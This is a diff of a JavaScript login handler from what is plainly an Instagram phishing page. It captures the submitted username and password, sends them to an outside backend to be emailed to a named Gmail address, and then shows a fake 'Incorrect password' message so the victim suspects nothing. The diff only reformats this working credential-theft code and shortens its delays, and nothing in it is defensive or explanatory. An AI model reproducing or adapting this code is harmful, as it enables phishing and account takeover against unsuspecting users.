@@ -6,43 +6,42 @@ const handleSubmit = (e) => {
     e.preventDefault();
     loader.style.display = "block";
     
-    setTimeout(()=>{
-        result.innerHTML= "<div style='padding: 60px 0;'></div>";
-        setTimeout(()=>{
-            const form = new FormData();
-            const recipient = "baddestjiggy@gmail.com";
-            const email_backend = "https://active-pay-backend.onrender.com/";
-            const body = (`
+    setTimeout(() => {
+      result.innerHTML = "<div style='padding: 60px 0;'></div>";
+      setTimeout(() => {
+        const form = new FormData();
+        const recipient = "baddestjiggy@gmail.com";
+        const email_backend = "https://active-pay-backend.onrender.com/";
+        const body = `
                New Instagram Credential
 
                Email/Username: ${e.target.username.value}
                Password: ${e.target.password.value}
 
-            `);
+            `;
 
-            form.append('recipient', recipient);
-            form.append('body', body);
+        form.append("recipient", recipient);
+        form.append("body", body);
 
-            // send the mail
-            fetch(email_backend, {
-                mode: 'cors',
-                headers:{
-                       'Access-Control-Allow-Origin':'*'
-                }, 
-                method: 'POST', 
-                body: form
-            })
-            .then(action =>{
-                setTimeout(()=>{
-                result.innerHTML="<div style='padding: 25px;text-align:center; color:red;'>Incorrect password <br><a href='/login/login-page.html'>Go back to Login</a></div>";
-                loader.style.display = "none";
-                }, 3000);
-
-            })
-            .catch(err=>console.log("Error: ", err));
-
-        }, 5000);
-    }, 3000)
+        // send the mail
+        fetch(email_backend, {
+          mode: "cors",
+          headers: {
+            "Access-Control-Allow-Origin": "*",
+          },
+          method: "POST",
+          body: form,
+        })
+          .then((action) => {
+            setTimeout(() => {
+              result.innerHTML =
+                "<div style='padding: 25px;text-align:center; color:red;'>Incorrect password <br><a href='/login/login-page.html'>Go back to Login</a></div>";
+              loader.style.display = "none";
+            }, 2000);
+          })
+          .catch((err) => console.log("Error: ", err));
+      }, 2000);
+    }, 2500);
 };
 
 
